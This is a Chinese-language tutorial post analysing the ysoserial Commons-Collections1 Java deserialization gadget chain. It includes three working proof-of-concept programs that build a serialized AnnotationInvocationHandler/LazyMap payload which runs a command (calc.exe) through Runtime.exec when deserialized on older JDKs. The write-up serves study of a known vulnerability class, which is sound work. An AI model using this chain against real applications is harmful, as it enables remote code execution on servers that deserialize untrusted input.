> 原文链接: https://www.anquanke.com//post/id/248653 


# ysoserial系列-Commons-Collections1链分析


                                阅读量   
                                **13614**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t01f431a9bcf46a2a44.jpg)](https://p2.ssl.qhimg.com/t01f431a9bcf46a2a44.jpg)



## 前言

在之前的文章中已经分析了**ysoserial**中 URLDNS 链，有兴趣的师傅可以阅读一下。但是这条链子也只是 Java 反序列化学习的开胃菜，接下来的 Commons-Collections 利用链才是主菜。

> [ysoserial系列-URLDNS链分析](http://121.40.251.109/2021/07/08/2021-7-8-ysoserial%E7%B3%BB%E5%88%97-URLDNS%E9%93%BE%E5%88%86%E6%9E%90/)

不过在正式分析 Common-Collections1 利用链之前，先讲解一下`Transformer`接口以及继承了这个接口的类。



## Transformer

找到它的源代码：

```
package org.apache.commons.collections;

public interface Transformer `{`
    Object transform(Object var1);
`}`
```

可以看到`Transformer`接口只有一个`transform`方法，之后所有继承该接口的类都需要实现这个方法。

再看一下官方文档如何描述这个方法的：

[![](https://p2.ssl.qhimg.com/t01ce076532ead08872.png)](https://p2.ssl.qhimg.com/t01ce076532ead08872.png)

大致意思就是会将传入的`object`进行转换，然后返回转换后的`object`。还是有点抽象，不过没关系，先放着接下来再根据继承该接口的类进行具体分析。

### <a class="reference-link" name="ConstantTransformer"></a>ConstantTransformer

部分源码如下：

```
public ConstantTransformer(Object constantToReturn) `{`
        this.iConstant = constantToReturn;
    `}`

public Object transform(Object input) `{`
    return this.iConstant;
`}`
```

`ConstantTransformer`类当中的`transform`方法就是将初始化时传入的对象返回。

### <a class="reference-link" name="InvokerTransformer"></a>InvokerTransformer

部分源码如下：

```
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) `{`
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    `}`

public Object transform(Object input) `{`
        if (input == null) `{`
            return null;
        `}` else `{`
            try `{`
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            `}` catch (NoSuchMethodException var5) `{`
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            `}` catch (IllegalAccessException var6) `{`
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            `}` catch (InvocationTargetException var7) `{`
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
            `}`
        `}`
    `}`
```

`InvokerTransformer`类的构造函数传入三个参数——方法名，参数类型数组，参数数组。在`transform`方法中通过反射机制调用传入某个类的方法，而调用的方法及其所需要的参数都在构造函数中进行了赋值，最终返回该方法的执行结果。

### <a class="reference-link" name="ChainedTransformer"></a>ChainedTransformer

部分源码如下：

```
public ChainedTransformer(Transformer[] transformers) `{`
        this.iTransformers = transformers;
    `}`

public Object transform(Object object) `{`
        for(int i = 0; i &lt; this.iTransformers.length; ++i) `{`
            object = this.iTransformers[i].transform(object);
        `}`

        return object;
    `}`
```

`ChainedTransformer`类利用之前构造方法传入的`transformers`数组通过循环的方式调用每个元素的`trandsform`方法，将得到的结果传入下一次循环的`transform`方法中。

那么这样我们可以利用`ChainedTransformer`将`ConstantTransformer`和`InvokerTransformer`的`transform`方法串起来。通过`ConstantTransformer`返回某个类，交给`InvokerTransformer`去调用类中的某个方法。



## demo 1

链条已经有了，就差让链条走起来了，以下POC都是基于P牛代码上修改的。

```
Map innerMap = new HashMap();
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
outerMap.put("test", "test");
```

看一下`TrandsformedMap`里的部分源码：

```
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) `{`
        return new TransformedMap(map, keyTransformer, valueTransformer);
    `}`

protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) `{`
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
`}`

protected Object transformKey(Object object) `{`
    return this.keyTransformer == null ? object : this.keyTransformer.transform(object);
`}`

protected Object transformValue(Object object) `{`
    return this.valueTransformer == null ? object : this.valueTransformer.transform(object);
`}`

public Object put(Object key, Object value) `{`
    key = this.transformKey(key);
    value = this.transformValue(value);
    return this.getMap().put(key, value);
`}`
```

`TransformedMap`的`decorate`方法根据传入的参数重新实例化一个`TransformedMap`对象，再看`put`方法的源码，不管是`key`还是`value`都会间接调用`transform`方法，而这里的`this.valueTransformer`也就是`transformerChain`，从而启动整个链子。

第一版的 POC 如下：

```
package ysoserial.CommonsCollections1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class demo `{`
    public static void main(String[] args) `{`
        Transformer[] transformers = new Transformer[] `{`
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]`{`String.class`}`,
                        new Object[]`{`"C:\\Windows\\System32\\calc.exe"`}`),
        `}`;

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "test");
    `}`
`}`
```

[![](https://p2.ssl.qhimg.com/t01e6550abd94c401d3.png)](https://p2.ssl.qhimg.com/t01e6550abd94c401d3.png)

[![](https://p2.ssl.qhimg.com/t01bffe9c0d7579efbf.png)](https://p2.ssl.qhimg.com/t01bffe9c0d7579efbf.png)

[![](https://p0.ssl.qhimg.com/t016aa396e256a61238.png)](https://p0.ssl.qhimg.com/t016aa396e256a61238.png)

[![](https://p3.ssl.qhimg.com/t01d09459532417dc9b.png)](https://p3.ssl.qhimg.com/t01d09459532417dc9b.png)

[![](https://p1.ssl.qhimg.com/t01f9a9966cd3be1109.png)](https://p1.ssl.qhimg.com/t01f9a9966cd3be1109.png)



## demo 2

在第一版 POC 中是手工添加了`put`操作，但是在反序列化的操作中我们需要找到一个类，直接或者间接的方式去调用类似于`put`的操作。

`AnnotationInvocationHandler`的`readObject`方法：

```
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException `{`
    var1.defaultReadObject();
    AnnotationType var2 = null;

    try `{`
        var2 = AnnotationType.getInstance(this.type);
    `}` catch (IllegalArgumentException var9) `{`
        throw new InvalidObjectException("Non-annotation type in annotation serial stream");
    `}`

    Map var3 = var2.memberTypes();
    Iterator var4 = this.memberValues.entrySet().iterator();

    while(var4.hasNext()) `{`
        Entry var5 = (Entry)var4.next();
        String var6 = (String)var5.getKey();
        Class var7 = (Class)var3.get(var6);
         if (var7 != null) `{`
            Object var8 = var5.getValue();
            if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy) `{`
               var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
            `}`
        `}`        
    `}`
`}`
```

这里的`memberValues`就是`TransformedMap`，在遍历`TransformedMap`里元素的时候调用了`setValue`

```
// AbstractInputCheckedMapDecorator.class
public Object setValue(Object value) `{`
    value = this.parent.checkSetValue(value);
    return super.entry.setValue(value);
`}`

// TransformedMap.class
protected Object checkSetValue(Object value) `{`
    return this.valueTransformer.transform(value);
`}`
```

所以将`transformerChain`作为参数传入`AnnotationInvocationHandler`，之后再将其反序列化即可完成调用链。

第二版的 POC 如下：

```
package ysoserial.CommonsCollections1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class LazyDemo `{`
    public static void main(String[] args) throws Exception `{`
        Transformer[] transformers = new Transformer[] `{`
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]`{`String.class, Class[].class`}`, new Object[]`{`"getRuntime", new Class[0]`}`),
                new InvokerTransformer("invoke", new Class[]`{`Object.class, Object[].class`}`, new Object[]`{`null, new Object[0]`}`),
                new InvokerTransformer("exec", new Class[]`{`String.class`}`, new Object[]`{`"C:\\Windows\\System32\\calc.exe"`}`)
        `}`;

        Transformer tranformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "1");
        Map outerMap = LazyMap.decorate(innerMap, tranformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, outerMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]`{`Map.class`}`, handler);
        handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    `}`
`}`
```

### <a class="reference-link" name="%E7%BB%86%E8%8A%82%201"></a>细节 1

**问：为什么传给 ConstantTransformer 的是 Runtime.class，而不直接传入 Runtime.getRuntime()**

答：这是因为在 Java 反序列化中，需要反序列化的对象必须实现`java.io.Serializable`接口，而`Runtime`类并没有实现该接口，所以这里得用反射的方式获取`Runtime`对象，而 POC 当中的 `Runtime.class`是`java.lang.Class`对象，该类实现了`java.io.Serializable`接口。

### <a class="reference-link" name="%E7%BB%86%E8%8A%82%202"></a>细节 2

**问：为什么通过反射的方式实例化 AnnotationInvocationHandler，并且为什么传入的是Target.class，该参数的作用是什么**

答：`AnnotationInvocationHandler`是 JDK 内部类，不能直接实例化；`AnnotationInvocationHandler`的`readObject`需要使得`var7 != null`，而它的条件为（P牛原答）

[![](https://p1.ssl.qhimg.com/t019bb79e64512ca36b.png)](https://p1.ssl.qhimg.com/t019bb79e64512ca36b.png)

### <a class="reference-link" name="%E7%BB%86%E8%8A%82%203"></a>细节 3

在调试该利用链的时候 JDK 版本必须小于8u71，因为在之后的版本中`AnnotationInvocationHandler:readObject`已经被官方修改了。

[![](https://p5.ssl.qhimg.com/t0156828f5665342865.png)](https://p5.ssl.qhimg.com/t0156828f5665342865.png)

[![](https://p3.ssl.qhimg.com/t01827e5875cee952b0.png)](https://p3.ssl.qhimg.com/t01827e5875cee952b0.png)

[![](https://p3.ssl.qhimg.com/t019d32f140ceef539b.png)](https://p3.ssl.qhimg.com/t019d32f140ceef539b.png)

[![](https://p2.ssl.qhimg.com/t01d3e16e0c017d99c6.png)](https://p2.ssl.qhimg.com/t01d3e16e0c017d99c6.png)

[![](https://p0.ssl.qhimg.com/t016635ab22bd25c524.png)](https://p0.ssl.qhimg.com/t016635ab22bd25c524.png)



## demo 3

在`ysoserial`中使用的并不是`TransformedMap`而是`LazyMap`。

`TransformedMap`与`LazyMap`不同的是，`LazyMap`中能够调用`transform`的只有`get`方法，所以无法在`AnnotationInvocationHandler:readObject`中直接使用。

```
public Object get(Object key) `{`
    if (!super.map.containsKey(key)) `{`
        Object value = this.factory.transform(key);
        super.map.put(key, value);
        return value;
    `}` else `{`
        return super.map.get(key);
    `}`
`}`
```

不过在`AnnotationInvocationHandler:invoke`中调用了`this.memberValues.get(var4)`（注释处），这里的`memberValues`就是`LazyMap`，所以需要通过某种方式在反序列化当中能够调用`AnnotationInvocationHandler:invoke`方法。

```
public Object invoke(Object var1, Method var2, Object[] var3) `{`
    String var4 = var2.getName();
    Class[] var5 = var2.getParameterTypes();
    if (var4.equals("equals") &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) `{`
        return this.equalsImpl(var3[0]);
    `}` else if (var5.length != 0) `{`
        throw new AssertionError("Too many parameters for an annotation method");
    `}` else `{`
        byte var7 = -1;
        switch(var4.hashCode()) `{`
        case -1776922004:
            if (var4.equals("toString")) `{`
                var7 = 0;
            `}`
            break;
        case 147696667:
            if (var4.equals("hashCode")) `{`
                var7 = 1;
            `}`
            break;
        case 1444986633:
            if (var4.equals("annotationType")) `{`
                var7 = 2;
            `}`
        `}`

        switch(var7) `{`
        case 0:
            return this.toStringImpl();
        case 1:
            return this.hashCodeImpl();
        case 2:
            return this.type;
        default:
            Object var6 = this.memberValues.get(var4); // here
            if (var6 == null) `{`
                throw new IncompleteAnnotationException(this.type, var4);
            `}` else if (var6 instanceof ExceptionProxy) `{`
                throw ((ExceptionProxy)var6).generateException();
            `}` else `{`
                if (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) !=0) `{`
                    var6 = this.cloneArray(var6);
                `}`

                return var6;
            `}`
        `}`
    `}`
`}`
```

`ysoserial`的作者使用了对象代理的方式，关于 Java 动态代理，这篇文章讲得很好

[https://www.zhihu.com/question/20794107](https://www.zhihu.com/question/20794107)

简而言之就是当调用到被代理对象的任何方法时，都会先调用`InvocationHandler`接口中的`invoke`方法，而`AnnotationInvocationHandler`正好实现了该接口。

所以修改后的 POC 如下：

```
package ysoserial.CommonsCollections1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class LazyDemo `{`
    public static void main(String[] args) throws Exception `{`
        Transformer[] transformers = new Transformer[] `{`
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]`{`String.class, Class[].class`}`, new Object[]`{`"getRuntime", new Class[0]`}`),
                new InvokerTransformer("invoke", new Class[]`{`Object.class, Object[].class`}`, new Object[]`{`null, new Object[0]`}`),
                new InvokerTransformer("exec", new Class[]`{`String.class`}`, new Object[]`{`"C:\\Windows\\System32\\calc.exe"`}`)
        `}`;

        Transformer tranformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, tranformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]`{`Map.class`}`, handler);
        // 因为反序列化的入口是 AnnotationInvocationHandler，所以需要将传入 proxyMap 去再次实例化 AnnotationInvocationHandler 
        handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    `}`
`}`
```



## 参考链接
1. [https://github.com/phith0n/JavaThings](https://github.com/phith0n/JavaThings)
1. [https://www.zhihu.com/question/20794107](https://www.zhihu.com/question/20794107)
1. [https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/](https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/)